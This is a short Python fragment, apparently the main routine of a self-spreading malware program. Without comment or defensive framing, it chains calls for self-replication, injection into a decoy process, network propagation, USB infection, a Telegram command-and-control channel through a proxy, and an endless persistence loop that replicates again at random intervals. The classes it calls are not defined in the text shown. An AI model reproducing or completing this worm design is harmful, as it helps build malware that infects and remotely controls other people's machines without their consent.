    # Phase 0: Ghost Initialization
    nemesis_init()

    # Phase 1: Self-Replication
    replicator = ShadowReplicator()
    replicator.replicate()

    # Phase 2: Process Injection
    if random.random() < 0.7:  # 70% chance to inject
        GhostInjector.inject_into_process(cfg.DECOY_PROCESS)

    # Phase 3: Network Propagation
    if cfg.AUTO_SPREAD:
        dominator = NetworkDominator()
        dominator.start()

    # Phase 4: USB Spreading
    usb_infector = USBInfector()
    usb_infector.start()

    # Phase 5: Telegram C2 with Pakistan Proxy
    comms = ApocalypseComms()
    comms.start()

    # Phase 6: Persistence Loop
    while True:
        time.sleep(300)
        if random.random() < 0.3:  # 30% chance to replicate every 5 minutes
            replicator.replicate()
